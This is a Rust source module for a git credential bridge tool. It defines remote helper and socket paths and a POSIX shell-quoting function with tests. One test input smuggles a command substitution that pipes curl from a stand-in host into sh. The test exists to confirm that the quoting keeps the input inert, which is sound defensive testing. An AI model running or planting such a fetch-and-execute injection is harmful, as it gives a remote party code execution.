//! Paths and quoting shared by ctl, the helper and the daemon.

/// Name of the helper binary on remotes (and the prefix of the per-platform
/// helper files, `git-credential-bridge-<arch>-<os>`).
pub const HELPER_BINARY: &str = "git-credential-bridge";

/// Where the helper lives on a remote, relative to `$HOME`.
pub const REMOTE_HELPER_RELATIVE: &str = ".local/bin/git-credential-bridge";

/// The forwarded socket on a remote, relative to `$HOME`.
pub const REMOTE_SOCKET_RELATIVE: &str = ".local/state/credential-bridge/bridge.sock";

/// Quotes `s` for a POSIX shell (and for git's `!` helpers, which run in one).
pub fn sh_quote(s: &str) -> String {
    let safe = !s.is_empty() && s.bytes().all(|b| b.is_ascii_alphanumeric() || b"/._-:@%+=,".contains(&b));
    if safe { s.to_owned() } else { format!("'{}'", s.replace('\'', r"'\''")) }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn quoting() {
        assert_eq!(sh_quote("/home/me/.local/bin/x"), "/home/me/.local/bin/x");
        assert_eq!(sh_quote(""), "''");
        assert_eq!(sh_quote("a b"), "'a b'");
        assert_eq!(sh_quote("it's"), r"'it'\''s'");
        assert_eq!(sh_quote("$HOME"), "'$HOME'");
        // What a hostile remote might put into a host name stays one inert word.
        assert_eq!(sh_quote("x'$(curl evil|sh)'"), r"'x'\''$(curl evil|sh)'\'''");
    }
}
